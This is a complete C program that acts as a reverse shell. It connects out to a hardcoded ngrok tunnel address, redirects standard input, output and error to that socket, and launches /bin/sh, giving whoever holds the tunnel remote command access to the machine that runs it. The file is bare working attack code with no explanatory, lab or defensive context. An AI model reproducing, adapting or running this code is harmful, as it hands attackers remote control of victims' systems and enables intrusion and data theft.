#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

int main()
{
    const char *hostname = "0.tcp.ap.ngrok.io";
    const char *port = "19129";

    struct addrinfo hints, *res;
    int sockfd;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;       // IPv4
    hints.ai_socktype = SOCK_STREAM; // TCP

    // Resolve hostname + port
    int status = getaddrinfo(hostname, port, &hints, &res);
    if (status != 0)
    {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(status));
        return 1;
    }

    sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (sockfd == -1)
    {
        perror("socket");
        freeaddrinfo(res);
        return 1;
    }

    if (connect(sockfd, res->ai_addr, res->ai_addrlen) == -1)
    {
        perror("connect");
        close(sockfd);
        freeaddrinfo(res);
        return 1;
    }

    printf("Connected to %s:%s\n", hostname, port);

    // Redirect stdin, stdout, stderr
    for (int i = 0; i < 3; i++)
    {
        dup2(sockfd, i);
    }

    // Execute shell
    execve("/bin/sh", NULL, NULL);

    return 0;
}
